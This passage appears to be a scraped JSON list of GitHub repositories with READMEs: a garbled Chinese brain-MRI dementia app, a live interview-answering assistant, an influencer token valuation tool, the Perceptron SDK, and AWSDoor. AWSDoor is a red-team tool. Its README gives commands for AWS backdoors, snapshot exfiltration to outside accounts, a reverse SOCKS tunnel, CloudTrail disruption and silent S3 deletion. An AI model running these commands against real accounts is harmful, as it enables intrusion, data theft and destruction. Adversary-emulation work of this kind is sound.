‰æùÂ∫èÂ°´ÂÖ•Ë∫´ÂàÜË≠âÂ≠óËôü„ÄÅÊãçÊîùÊó•Êúü„ÄÅËÖ¶ÈÉ®MRIÂΩ±ÂÉèËàáË™çÁü•Ê∏¨È©óÁµêÊûúÔºà‰∏≠‰ΩéÂπ¥ÈΩ°Áæ§È´î‰∏çÈúÄË¶ÅÂ°´ÂØ´Ê≠§Ê¨Ñ‰ΩçÔºâÔºåÈªûÊìä„ÄåÂª∫Ê™î„ÄçÔºåË≥áÊñôÂ∞áÂÇ≥ÈÅûËá≥‰º∫ÊúçÂô®‰∏¶Âú®Ë≥áÊñôÂ∫´‰∏≠ÂàùÂßãÂåñ‰∏ÄÁ≠ÜÂΩ±ÂÉèÁ¥ÄÈåÑÔºå‰∏¶Ëá™ÂãïÂ°´ÂØ´ÂØ¶ÈöõÂπ¥ÈΩ°„ÄÇ\n2. ÈªûÊìä„ÄåAIË®àÁÆó„ÄçÔºå‰º∫ÊúçÂô®Â∞áÊ†πÊìöË≥áÊñôÂ∫´‰∏≠ÁöÑË≥áÊñôÈÅãË°åËÖ¶ÈΩ°È†êÊ∏¨Ê®°ÂûãËàáÂ§±Êô∫ÁóáË®∫Êñ∑Ê®°ÂûãÔºàËã•Êú™Â°´ÂÖ•Ë™çÁü•Ê∏¨È©óÁµêÊûúÔºåÂâá‰∏çÊúÉÈÅãË°åÂ§±Êô∫ÁóáË®∫Êñ∑Ê®°ÂûãÔºâÔºåÈÅãÁÆóÁµêÊùüÂæåÂ∞áÁµêÊûúËá™ÂãïÂ°´ÂÖ•Áõ∏Â∞çÊáâÊ¨Ñ‰Ωç‰∏≠„ÄÇ\n3. ÈªûÊìä„ÄåÂÑ≤Â≠ò„ÄçÔºåÂ∞áÈ†êÊ∏¨ÁµêÊûúÊõ¥Êñ∞ÁΩÆË≥áÊñôÂ∫´„ÄÇ\n\n![ÈÜ´Â∏´‰ªãÈù¢‚ÄîÊñ∞Â¢ûÊàêÂì°](images/addMember.png)\n> Âúñ7. ÈÜ´Â∏´‰ªãÈù¢‚ÄîÊñ∞Â¢ûÊàêÂì°\n\nÂúñ7È†ÅÈù¢Êèê‰æõÁÆ°ÁêÜËÄÖÊñ∞Â¢ûÂèóË©¶ËÄÖÁöÑÂúñÂΩ¢Âåñ‰ªãÈù¢Ôºå‰æùÂ∫èÂ°´ÂÖ•ÂßìÂêç„ÄÅË∫´ÂàÜË≠âÂ≠óËôü„ÄÅÂá∫ÁîüÊó•Êúü„ÄÅÊÄßÂà•ËàáÂÄã‰∫∫ÁÖßÔºåÈªûÊìä„ÄåÈÄÅÂá∫„ÄçÔºå‰æøÂèØÂø´ÈÄüÂª∫Á´ã‰∏ÄËà¨‰ΩøÁî®ËÄÖÂ∏≥Ëôü„ÄÇ\n\n![‰∏ÄËà¨‰ΩøÁî®ËÄÖ‰ªãÈù¢‚ÄîËÖ¶ÈÉ®ÂàÜÊûê](images/brainAnalysis.png)\n> Âúñ8. ‰∏ÄËà¨‰ΩøÁî®ËÄÖ‰ªãÈù¢‚ÄîËÖ¶ÈÉ®ÂàÜÊûê\n\nÂúñ8È†ÅÈù¢Êèê‰æõÂèóË©¶ËÄÖÔºàÂèäÁÆ°ÁêÜËÄÖÔºâÊü•Èñ±ËÖ¶ÈÉ®ÂàÜÊûêÁµêÊûúÔºå‰∏äÊñπÁöÑÁ™óÊ†ºÈ°ØÁ§∫ÊúÄËøë‰∏ÄÊ¨°AIÂ§±Êô∫ÁóáË®∫Êñ∑ÁµêÊûúÔºåËã•Êú™ÊõæÊ™¢Ê∏¨Ââá‰∏çÈ°ØÁ§∫ÁµêÊûúÔºõ‰∏ãÊñπÁöÑÁ™óÊ†ºÂâáÈ°ØÁ§∫Ê≠∑Ê¨°Ê™¢Ê∏¨ÁöÑÂØ¶ÈöõÂπ¥ÈΩ°ËàáËÖ¶ÈΩ°ÊäòÁ∑öÂúñÔºåÂèóË©¶ËÄÖËÉΩÁõ¥ËßÄÁúãË¶ãËÖ¶ÈÉ®ÁôºÂ±ïËªåË∑°„ÄÇ\n\n![‰∏ÄËà¨‰ΩøÁî®ËÄÖ‰ªãÈù¢‚ÄîÂΩ±ÂÉèÁ¥ÄÈåÑa](images/recordsA.png)\n> Âúñ9(a). ‰∏ÄËà¨‰ΩøÁî®ËÄÖ‰ªãÈù¢‚ÄîÂΩ±ÂÉèÁ¥ÄÈåÑ\n\n![‰∏ÄËà¨‰ΩøÁî®ËÄÖ‰ªãÈù¢‚ÄîÂΩ±ÂÉèÁ¥ÄÈåÑb](images/recordsB.png)\n> Âúñ9(b). ‰∏ÄËà¨‰ΩøÁî®ËÄÖ‰ªãÈù¢‚ÄîÂΩ±ÂÉèÁ¥ÄÈåÑ\n\nÂúñ9È†ÅÈù¢Êèê‰æõÂèóË©¶ËÄÖÔºàÂèäÁÆ°ÁêÜËÄÖÔºâÊü•Èñ±ËÖ¶Ê≠∑Ê¨°ÂΩ±ÂÉèÁ¥ÄÈåÑÁ¥∞ÁØÄÔºåÂæû‰∏äÊñπÁöÑÁ™óÊ†ºÔºàÂúñ9(a)ÔºâÂèØ‰ª•ÈÅ∏ÂèñÊ¨≤Êü•ÁúãÁöÑÂΩ±ÂÉèÁ¥ÄÈåÑÔºåÈªûÊìä„ÄåÈÅ∏Âèñ„ÄçÔºåÂâáÊúÉÂú®‰∏ãÊñπÔºàÂúñ9(b)ÔºâÈ°ØÁ§∫Ë©≤Ê¨°MRIÂΩ±ÂÉèÔºàÂèØÂêåÊôÇÈñãÂïüÂ§öÁ≠ÜÂΩ±ÂÉèÁ¥ÄÈåÑÔºâÔºå‰ΩøÁî®ËÄÖÈÄèÊûúÊªëÈº†ÊªæËº™ÂèØ‰ª•Ê™¢Ë¶ñÂêÑÊñπÂêëËÖ¶ÈÉ®Á¥∞ÁØÄÔºåÂãæÈÅ∏„ÄåÈ°ØÁ§∫ÈóúÈçµËÖ¶ÂçÄ„ÄçÂäüËÉΩÔºåMRIÂΩ±ÂÉè‰∏äÊúÉÈ°ØÁ§∫ÂÖ∂ÈóúÈçµËÖ¶ÂçÄÁÜ±ÂúñËºîÂä©Âà§ËÆÄ„ÄÇ\n\n---\n\n## üßë‚ÄçüåæÈñãÁôºÂúòÈöä\n\n| ÊàêÂì°     | Ë≤†Ë≤¨Â∑•‰Ωú |\n|----------|--------------------------------------------------------------------------|\n| È°èÂ∞ë‰∫é   | ‰∏ªÊåÅ Trajectory ÈñãÁôº„ÄÅÂâçÁ´ØË®≠Ë®à„ÄÅÂâçÂæåÁ´ØÊï¥Âêà„ÄÅËÖ¶ÈΩ°È†êÊ∏¨Ê®°Âûã‰∏≤Êé• |\n| ÁéãÂÜ†Êô∫   | ÂæåÁ´Ø API Ë®≠Ë®à„ÄÅË≥áÊñôÂ∫´„ÄÅÊï¥Âêà AI Ê®°ÁµÑ„ÄÅÊ†°Â§ñÁ´∂Ë≥ΩÊñá‰ª∂ |\n| ÂæêÁùøÊ∑≥   | MRI ÂàáÁâáÂÑ≤Â≠ò„ÄÅÂ§±Êô∫ÁóáÂàÜÈ°ûÊ®°Âûã‰∏≤Êé•„ÄÅ‰ªãÁ¥πÂΩ±ÁâáË£Ω‰Ωú„ÄÅÁ≥ªÁµ±ÂäüËÉΩË¶èÂäÉ   |\n| ÂäâÂ≠∏Ë´∫   | Â§±Êô∫ÁóáÂàÜÈ°ûÊ®°ÂûãÈñãÁôº |\n",
      "default_branch": "main"
    },
    "fetched_at": "2025-09-18T10:40:04.370715"
  },
  {
    "basic_info": {
      "name": "Trotski",
      "full_name": "iluxu/Trotski",
      "owner": "iluxu",
      "description": "Real-time AI Interview Assistant. Transcribes live audio with faster-whisper, detects questions, and generates answers using an LLM. Includes a multi-platform client and a web UI dashboard. Your personal interview co-pilot.",
      "url": "https://github.com/iluxu/Trotski",
      "clone_url": "https://github.com/iluxu/Trotski.git",
      "ssh_url": "git@github.com:iluxu/Trotski.git",
      "homepage": null,
      "created_at": "2025-09-17T07:07:42Z",
      "updated_at": "2025-09-18T06:05:20Z",
      "pushed_at": "2025-09-17T12:08:52Z"
    },
    "stats": {
      "stars": 16,
      "forks": 2,
      "watchers": 16,
      "open_issues": 0,
      "size": 59
    },
    "tech_info": {
      "language": "HTML",
      "languages": {
        "HTML": 42318,
        "Python": 35225
      },
      "license": "MIT License",
      "topics": []
    },
    "content": {
      "readme": "# Trotski - Real-Time AI Interview Assistant\n\nThis project provides a high-performance, real-time audio transcription and AI-powered answering server. It uses faster-whisper for low-latency STT (Speech-to-Text) and an LLM (like GPT models) to intelligently detect questions from the transcript and generate relevant, in-character answers on the fly.\n\nThe system is composed of three main parts:\n\n- **The Server** (`optimized_stt_server_v3.py`): A WebSocket server that receives raw audio, transcribes it, analyzes the text for questions, and generates answers.\n- **The Client** (`stable_audio_client_multi_os.py`): A robust, multi-platform audio streaming client that captures microphone input using FFmpeg and streams it to the server.\n- **The UI** (`index.html`): A standalone, zero-dependency web interface that connects to the server to display the live transcript and Q&A panel.\n\n## ‚ú® Features\n\n- **Real-Time Transcription**: Low-latency audio transcription using faster-whisper\n- **Intelligent Question Detection**: An LLM-powered analyzer detects questions from the live transcript\n- **AI-Powered Answer Generation**: Generates context-aware, in-character answers for detected questions\n- **Standalone Web UI**: A feature-rich, single-file `index.html` dashboard to monitor the interview\n- **Multi-Platform Support**: The server and client run on Windows, macOS, and Linux\n- **Robust & Stable**: Includes automatic reconnection, backpressure handling, and stable connection parameters\n- **Highly Configurable**: Nearly every aspect can be configured via environment variables\n\n## üìã Prerequisites\n\nBefore you begin, ensure you have the following installed:\n\n### Python 3.9+\n\n### FFmpeg\nRequired by the audio client to capture microphone audio.\n\n- **Windows**: Download from the [official website](https://ffmpeg.org/download.html) and add to PATH, or use Chocolatey (`choco install ffmpeg`)\n- **macOS**: Install via Homebrew: `brew install ffmpeg`\n- **Linux**: Install via your package manager: `sudo apt-get install ffmpeg` (Debian/Ubuntu)\n\n### NVIDIA GPU with CUDA (Recommended)\nFor significant performance gains with the Whisper model.\n\n- Install the latest [NVIDIA Driver](https://www.nvidia.com/drivers/)\n- Install the [CUDA Toolkit](https://developer.nvidia.com/cuda-toolkit) (v11.x is compatible)\n- Install [cuDNN](https://developer.nvidia.com/cudnn)\n\n### OpenAI API Key\nRequired for question detection and answer generation.\n\n## üöÄ Installation\n\n### 1. Clone the Repository\n\n```bash\ngit clone https://github.com/iluxu/Trotski.git\ncd Trotski\n```\n\n### 2. Create a Virtual Environment\n\n```bash\npython -m venv venv\n\n# On Windows\n.\\venv\\Scripts\\activate\n\n# On macOS/Linux\nsource venv/bin/activate\n```\n\n### 3. Install Python Dependencies\n\nCreate a `requirements.txt` file with the content specified below and run:\n\n```bash\npip install -r requirements.txt\n```\n\n**CPU-Only Note**: If you don't have an NVIDIA GPU, first install the CPU version of PyTorch:\n```bash\npip install torch --index-url https://download.pytorch.org/whl/cpu\n```\nThen run `pip install -r requirements.txt`.\n\n### 4. Set Up Environment Variables\n\nCreate a `.env` file by copying the example:\n\n```bash\n# On Windows\ncopy .env.example .env\n\n# On macOS/Linux\ncp .env.example .env\n```\n\nNow, edit the `.env` file and add your `OPENAI_API_KEY`. See the `.env.example` section for all options.\n\n## ‚öôÔ∏è Usage\n\nThe process involves three steps: starting the server, opening the UI, and starting the audio client.\n\n### 1. Run the Server\n\nStart the server in a terminal. It will download the Whisper model on its first run.\n\n```bash\npython optimized_stt_server_v3.py\n```\n\nYou should see output indicating the server is ready:\n```\nüé§ Server ready on ws://127.0.0.1:8123/\n```\n\n### 2. Open the Web UI\n\nSimply open the `index.html` file in your web browser (e.g., Chrome, Firefox, Safari). No web server is needed. The page will automatically try to connect to the WebSocket server running on your local machine.\n\n### 3. Run the Audio Client\n\nThe client needs to know which microphone to use.\n\n#### Step A: Find Your Audio Device\n\nOpen a new terminal and run the client with the `--list-devices` flag:\n\n```bash\npython stable_audio_client_multi_os.py --list-devices\n```\n\nThis will show you a list of available microphones and the correct name to use for your operating system.\n\n#### Step B: Start Streaming\n\nNow, run the client with the device name you found.\n\n```bash\n# Example for Windows\npython stable_audio_client_multi_os.py --device \"Mixage st√©r√©o (Realtek(R) Audio)\"\n\n# Example for macOS\npython stable_audio_client_multi_os.py --device \":0\"\n\n# Example for Linux\npython stable_audio_client_multi_os.py --device \"hw:0,0\"\n```\n\nThe client will connect to the server. Start speaking, and you will see the live transcript and Q&A appear in the `index.html` UI in your browser.\n\n## üñ•Ô∏è Web UI Features (index.html)\n\nThe web UI is a powerful dashboard for monitoring the interview in real-time.\n\n<!-- It's a good idea to add a screenshot of your ",
      "default_branch": "main"
    },
    "fetched_at": "2025-09-18T10:40:05.634905"
  },
  {
    "basic_info": {
      "name": "CLOV",
      "full_name": "Aihy/CLOV",
      "owner": "Aihy",
      "description": "Valuation of tokens corresponding to influential individuals on social platforms through AI algorithms",
      "url": "https://github.com/Aihy/CLOV",
      "clone_url": "https://github.com/Aihy/CLOV.git",
      "ssh_url": "git@github.com:Aihy/CLOV.git",
      "homepage": "",
      "created_at": "2025-09-17T08:06:46Z",
      "updated_at": "2025-09-18T10:27:00Z",
      "pushed_at": "2025-09-17T08:14:22Z"
    },
    "stats": {
      "stars": 16,
      "forks": 1,
      "watchers": 16,
      "open_issues": 0,
      "size": 2988
    },
    "tech_info": {
      "language": "TypeScript",
      "languages": {
        "TypeScript": 462909,
        "CSS": 12292,
        "JavaScript": 372
      },
      "license": "MIT License",
      "topics": [
        "ai",
        "ai-agents",
        "chatbot"
      ]
    },
    "content": {
      "readme": "# Valuation of Social Media Influencers' Tokens with AI\n\nThis project explores the **valuation of tokens corresponding to influential individuals on social platforms**. The platform allows users to input the identity (e.g., username or profile link) of a social media influencer. An AI-powered system then performs a comprehensive analysis and provides an estimated **market capitalization** for a hypothetical cryptocurrency tied to that influencer.  \n\nOur approach combines:\n- **Multi-model AI computations**\n- **Data-driven analysis of engagement and pump/dump activities**\n- **Simulation of tokenized valuation dynamics**\n\n---\n\n## üöÄ Features\n- Input any social media influencer (Twitter, Instagram, TikTok, etc.)\n- AI-powered sentiment, influence, and reach analysis\n- Pump-activity and market manipulation detection\n- Estimated **cryptocurrency market cap valuation**\n- Extensible architecture for integrating more data sources\n\n---\n\n## üìä Example Workflow\n\n1. **User Input**: Enter the influencer‚Äôs handle (e.g., `@elonmusk`).\n2. **AI Analysis**:\n   - Retrieve metrics (followers, engagement rates, sentiment).\n   - Apply multi-model AI analysis (influence scoring + pump activity detection).\n   - Predict potential crypto token valuation.\n3. **Output**: Market cap estimation, confidence intervals, and visual analytics.\n\n---\n\n## ‚öôÔ∏è Installation\n\nClone this repository:\n```bash\ngit clone https://github.com/yourusername/influencer-token-valuation.git\ncd influencer-token-valuation\n\nInstall dependencies:\n\npip install -r requirements.txt\n\nüßë‚Äçüíª Usage\nCommand Line\n\npython main.py --influencer \"@elonmusk\"\n\nSample Output\n\n{\n  \"influencer\": \"@elonmusk\",\n  \"influence_score\": 97.5,\n  \"predicted_market_cap\": \"12.5B USD\",\n  \"confidence_interval\": \"10.2B - 14.8B\",\n  \"pump_activity_risk\": \"High\"\n}\n\nüß© Code Examples\n1. Basic Influencer Analysis\n\nfrom valuation import InfluencerValuation\n\nanalyzer = InfluencerValuation()\n\nresult = analyzer.evaluate_influencer(\"@elonmusk\")\nprint(result)\n\n2. Multi-Model AI Integration\n\nfrom models import SentimentModel, InfluenceModel, PumpActivityModel\n\ndef run_analysis(username):\n    sentiment = SentimentModel().analyze(username)\n    influence = InfluenceModel().score(username)\n    pump_risk = PumpActivityModel().detect(username)\n\n    market_cap = (influence * sentiment) / (1 + pump_risk)\n    return {\n        \"sentiment\": sentiment,\n        \"influence\": influence,\n        \"pump_risk\": pump_risk,\n        \"predicted_market_cap\": f\"{market_cap:.2f}B USD\"\n    }\n\nprint(run_analysis(\"@vitalikbuterin\"))\n\n3. API Example (Flask)\n\nfrom flask import Flask, request, jsonify\nfrom valuation import InfluencerValuation\n\napp = Flask(__name__)\nanalyzer = InfluencerValuation()\n\n@app.route(\"/evaluate\", methods=[\"POST\"])\ndef evaluate():\n    data = request.get_json()\n    username = data.get(\"influencer\")\n    result = analyzer.evaluate_influencer(username)\n    return jsonify(result)\n\nif __name__ == \"__main__\":\n    app.run(debug=True)\n\nüìê Mathematical Formula\n\nWe approximate the valuation using a simplified formula:\nPredictedMarketCap‚âà(InfluenceScore√óSentimentScore)√∑(1+PumpRiskFactor)\nPredictedMarketCap‚âà(InfluenceScore√óSentimentScore)√∑(1+PumpRiskFactor)\n\nWhere:\n\n    Influence Score = Derived from followers, engagement, and reach.\n\n    Sentiment Score = Weighted average of positive/negative sentiment.\n\n    Pump Risk Factor = Likelihood of manipulative activity.\n\nüìà Roadmap\n\nExpand social media API coverage\n\nImprove AI model ensemble strategies\n\nAdd visualization dashboards\n\n    Deploy as a hosted web app\n\nü§ù Contributing\n\nContributions are welcome! Please submit a pull request or open an issue to discuss ideas.\n",
      "default_branch": "master"
    },
    "fetched_at": "2025-09-18T10:40:06.755125"
  },
  {
    "basic_info": {
      "name": "Stencil-Buffer-Holographic-Display",
      "full_name": "lukky-nl/Stencil-Buffer-Holographic-Display",
      "owner": "lukky-nl",
      "description": null,
      "url": "https://github.com/lukky-nl/Stencil-Buffer-Holographic-Display",
      "clone_url": "https://github.com/lukky-nl/Stencil-Buffer-Holographic-Display.git",
      "ssh_url": "git@github.com:lukky-nl/Stencil-Buffer-Holographic-Display.git",
      "homepage": null,
      "created_at": "2025-09-17T11:06:03Z",
      "updated_at": "2025-09-18T03:56:33Z",
      "pushed_at": "2025-09-17T11:09:06Z"
    },
    "stats": {
      "stars": 15,
      "forks": 0,
      "watchers": 15,
      "open_issues": 0,
      "size": 306
    },
    "tech_info": {
      "language": null,
      "languages": {},
      "license": "MIT License",
      "topics": []
    },
    "content": {
      "readme": "",
      "default_branch": "main"
    },
    "fetched_at": "2025-09-18T10:40:07.870374"
  },
  {
    "basic_info": {
      "name": "perceptron",
      "full_name": "perceptron-ai-inc/perceptron",
      "owner": "perceptron-ai-inc",
      "description": "The official Python SDK for the Perceptron API",
      "url": "https://github.com/perceptron-ai-inc/perceptron",
      "clone_url": "https://github.com/perceptron-ai-inc/perceptron.git",
      "ssh_url": "git@github.com:perceptron-ai-inc/perceptron.git",
      "homepage": "https://www.perceptron.inc",
      "created_at": "2025-09-17T02:25:49Z",
      "updated_at": "2025-09-18T06:18:54Z",
      "pushed_at": "2025-09-17T17:21:37Z"
    },
    "stats": {
      "stars": 14,
      "forks": 1,
      "watchers": 14,
      "open_issues": 0,
      "size": 305
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 271445
      },
      "license": "MIT License",
      "topics": []
    },
    "content": {
      "readme": "# Perceptron SDK\n\nPython SDK and CLI for perceptive-language models. The SDK is provider-agnostic and lets you compose visual + language tasks, run them locally for inspection, or execute them via a configured provider. Choose a provider and optional model per call; keep your application code stable across model updates.\n\n---\n\n## Installation\n- Prerequisites: Python 3.10+, `pip` 23+ (or [`uv`](https://github.com/astral-sh/uv))\n\n```bash\npip install perceptron\n\n# Optional extras\npip install \"perceptron[torch]\"   # TensorStream helpers (requires PyTorch)\npip install \"perceptron[dev]\"     # Dev tools (ruff, pytest, pre-commit)\n```\n\nUsing `uv`:\n```bash\nuv pip install perceptron\nuv pip install \"perceptron[torch]\"\nuv pip install \"perceptron[dev]\"\n```\n\nThe CLI entry point `perceptron` is available after install.\n\n---\n\n## Configuration\nSet credentials and defaults via environment, programmatically, or the CLI. The SDK ships with a `fal` provider; you can add others by extending `perceptron.client._PROVIDER_CONFIG`.\n\n- `PERCEPTRON_PROVIDER`: provider identifier (default `fal`)\n- `PERCEPTRON_API_KEY`: API key for the selected provider\n- `PERCEPTRON_BASE_URL`: override provider base URL when needed\n- `FAL_KEY`: alternative env var used when `provider=fal`\n\nProgrammatic configuration:\n```python\nfrom perceptron import configure, config\n\nconfigure(provider=\"fal\", api_key=\"sk_live_...\", base_url=\"https://api.example/v1\")\n\nwith config(max_tokens=512):\n    ...  # temporary overrides inside the context\n```\n\nCLI helper:\n```bash\nperceptron config --provider fal --api-key sk_live_...\n```\n\nNo credentials? Helpers return compile-only payloads so you can inspect tasks without sending requests.\n\n---\n\n## Python Quickstart\n```python\nfrom perceptron import caption, detect\n\n# Caption an image (provider default model)\nresult = caption(\"/path/to/image.png\", style=\"concise\")\nprint(result.text)\n\n# Stream grounded detections; optionally select a specific model\nfor event in detect(\"local.png\", classes=[\"person\", \"forklift\"], model=\"perceptron\", stream=True):\n    if event[\"type\"] == \"text.delta\":\n        print(\"chunk\", event[\"chunk\"])\n    elif event[\"type\"] == \"points.delta\":\n        print(\"bbox\", event[\"points\"])\n    elif event[\"type\"] == \"final\":\n        print(\"final\", event[\"result\"][\"points\"])\n```\n\n### Few-shot detection from COCO\n```python\nfrom perceptron import detect_from_coco\n\nruns = detect_from_coco(\n    \"/datasets/demo\",\n    split=\"train\",\n    shots=4,                 # build balanced in-context examples automatically\n    classes=[\"defect\", \"ok\"],\n)\n\nfor sample in runs:\n    print(sample.image_path.name)\n    for box in sample.result.points or []:\n        print(\" -\", box.mention, box)\n```\n\n---\n\n## CLI Usage\nThe CLI mirrors the high-level helpers and supports directory batching (JSON summaries written alongside input folders).\n\n```bash\n# Generate captions\nperceptron caption image.jpg\nperceptron caption ./images --style detailed\n\n# OCR with a custom prompt\nperceptron ocr schematic.png --prompt \"Extract component labels\"\n\n# Batched detection (writes detections.json)\nperceptron detect ./frames --classes defect,warning\n\n# Grounded question answering\nperceptron question image.jpg \"What stands out?\" --expects box --format json\n```\n\nDirectory mode disables streaming and logs raw responses, plus per-file validation issues.\n\n---\n\n## High-Level APIs\n- `caption(image, *, style=\"concise\", stream=False, **kwargs)`\n- `ocr(image, *, prompt=None, stream=False, **kwargs)`\n- `detect(image, *, classes=None, examples=None, stream=False, **kwargs)`\n- `detect_from_coco(dataset_dir, *, split=None, classes=None, shots=0, limit=None, **kwargs)`\n\nNotes\n- Pass `model=\"...\"`, `provider=\"...\"`, `max_tokens=...`, etc., through `**kwargs` on any helper.\n- `detect_from_coco` discovers annotations, constructs balanced examples when `shots > 0`, and returns `CocoDetectResult` objects.\n- For advanced workflows, build tasks with the typed DSL (`text`, `system`, `image`, `point`, `box`, `polygon`, `collection`) and decorate with `@perceive` / `@async_perceive`.\n\n### Using the DSL with `@perceive`\n```python\nfrom perceptron import perceive, image, text\n\n@perceive(expects=\"box\")\ndef describe_landmark(path):\n    return image(path) + text(\"Highlight the main structures in one sentence.\")\n\nresult = describe_landmark(\"./landmark.jpg\")\nprint(result.text)\nfor box in result.points or []:\n    print(box.mention, box)\n\n# Inspect the compiled payload without executing the request\nprint(describe_landmark.inspect(\"./landmark.jpg\"))\n```\n\nSet `stream=True` in the decorator to receive incremental events (`text.delta`, `points.delta`, `final`). Swap `expects` to `text`, `point`, or `polygon` when you need alternate structures.\n\n---\n\n## Troubleshooting\n| Symptom | Likely Cause | Resolution |\n| --- | --- | --- |\n| Compile-only result (no text) | Missing provider credentials | Export `FAL_KEY` / `PERCEPTRON_API_KEY` or call `configure(...)` |\n| `stream_buffer_overflow` warning | Long streaming r",
      "default_branch": "main"
    },
    "fetched_at": "2025-09-18T10:40:08.997836"
  },
  {
    "basic_info": {
      "name": "AWSDoor",
      "full_name": "OtterHacker/AWSDoor",
      "owner": "OtterHacker",
      "description": "AWSDoor is a red team automation tool designed to simulate advanced attacker behavior in AWS environments",
      "url": "https://github.com/OtterHacker/AWSDoor",
      "clone_url": "https://github.com/OtterHacker/AWSDoor.git",
      "ssh_url": "git@github.com:OtterHacker/AWSDoor.git",
      "homepage": null,
      "created_at": "2025-09-17T07:06:43Z",
      "updated_at": "2025-09-18T09:26:25Z",
      "pushed_at": "2025-09-17T07:09:14Z"
    },
    "stats": {
      "stars": 14,
      "forks": 1,
      "watchers": 14,
      "open_issues": 0,
      "size": 978
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 36144
      },
      "license": null,
      "topics": []
    },
    "content": {
      "readme": "# AWSDoor\n\n> This readme has been AI generated\n\n**AWSDoor** is a red team automation tool designed to simulate advanced attacker behavior in AWS environments. It automates the deployment of persistence mechanisms, data exfiltration techniques, destructive operations, and defense impairment tactics, enabling security teams to test their detection and response capabilities against realistic cloud-native threats.\n\nFurther technical information [here](https://www.riskinsight-wavestone.com/en/2025/09/awsdoor-persistence-on-aws/)\n\n## üîç Purpose\n\nAs AWS becomes a critical infrastructure platform, attackers increasingly exploit its flexibility to maintain stealthy and durable access. AWSDoor helps red teams replicate these techniques in a controlled and auditable manner, supporting Threat-Led Penetration Testing (TLPT) and adversary emulation in cloud environments.\n\n---\n\n## üöß Future Improvements\nAWSDoor is an evolving project. New techniques for persistence, exfiltration, evasion, and other attack vectors will be continuously added to reflect the latest developments in cloud threat landscapes. Stay tuned for upcoming updates!\n\n## ‚ú® Features\n\n### 1. Persistence Techniques\n- **AccessKey Injection**: Add access keys to existing IAM users.\n- **Trust Policy Backdooring**: Modify trust policies to allow external role assumption.\n- **NotAction Policy Abuse**: Create overly permissive IAM policies using `NotAction`.\n- **Lambda-Based Persistence**: Deploy backdoors via Lambda functions or poisoned Lambda layers.\n\n### 2. Data Exfiltration\n- **Snapshot Exfiltration**: Share EBS snapshots with external AWS accounts.\n- **EC2 Reverse SOCKS**: Use EC2 and SSM to establish reverse SOCKS tunnels for lateral movement.\n\n### 3. Destruction Techniques\n- **S3 Shadow Deletion**: Deploy lifecycle policies to silently delete S3 data.\n- **Leave Organization**: Detach AWS accounts from Organizations to evade governance and enable long-term compromise.\n\n### 4. Defense Impairment\n- **CloudTrail Logging Disruption**: Stop logging or modify event selectors to reduce visibility.\n- **CloudWatch and Config Tampering**: Impair monitoring and alerting mechanisms.\n\n---\n\n## üß™ Example Usage\n\n\n### AccessKey Injection\n```bash\npython .\\main.py -m AccessKey -u adele.vance\n```\n\n### Trust Policy Backdooring\n```bash\npython .\\main.py -m TrustPolicy -r FAKEROLE -a 584739118107\n```\n\n### NotAction Policy Abuse\n```bash\npython .\\main.py -m NotAction -r FAKEROLE -p ROGUEPOLICY\n```\n\n### Lambda-Based Persistence\n```bash\npython .\\main.py -m AdminLambda -r FAKEROLE -n lambda_test2 -l\n```\n### Snapshot Exfiltration\n```bash\npython .\\main.py -m EC2DiskExfiltration -i i-0021dfcf18a891b07 -a 503561426720\n```\n### EC2 Reverse SOCKS\n```bash\npython .\\main.py -m EC2Socks -name i-0021dfcf18a891b07 -key \"ssh-ed25519 AAAA...\" -remotekey path/to/key.pem -user ec2-user -socksport 4444 -sshuser admin -sshhost 13.38.79.236 --method systemd\n```\n\n### CloudTrail Logging Disruption\n```bash\npython .\\main.py --m CloudTrailStop -s \n```\n\n### S3 Shadow Deletion\n```bash\npython .\\main.py --m S3ShadowDelete -n s3bucketname\n```\n\n## üôè Acknowledgments\nThis tool was developed as part of internal R&D efforts at Wavestone. Special thanks to Wavestone for supporting the research and development of AWSDoor.\n\n## üìö Coming Soon\nA full technical article will be published to provide in-depth explanations of each technique implemented in AWSDoor, including detection strategies and mitigation recommendations.\n",
      "default_branch": "main"
    },
    "fetched_at": "2025-09-18T10:40:10.122438"
  }
]